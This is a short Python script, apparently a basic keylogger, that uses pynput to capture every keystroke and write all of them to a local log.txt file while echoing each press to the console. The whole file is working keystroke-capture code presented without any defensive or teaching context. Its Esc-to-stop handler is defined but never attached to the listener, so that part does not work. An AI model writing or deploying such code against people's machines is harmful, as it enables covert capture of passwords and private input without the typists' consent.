

import pynput
from pynput.keyboard import Key, Listener

keys = []


def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))


def write_file(key):
    with open('log.txt', 'w') as f:
        for key in keys:
            # Removing ''
            k = str(key).replace("'", "")
            f.write(k)

            # Every keystroke for readability

            f.write(' ')


def on_release(key):
    print('{0} released'.format(key))
    if key == key.esc:
        # Stop listener
        return False


with Listener(on_press=on_press,
    ) as listener:
    listener.join()
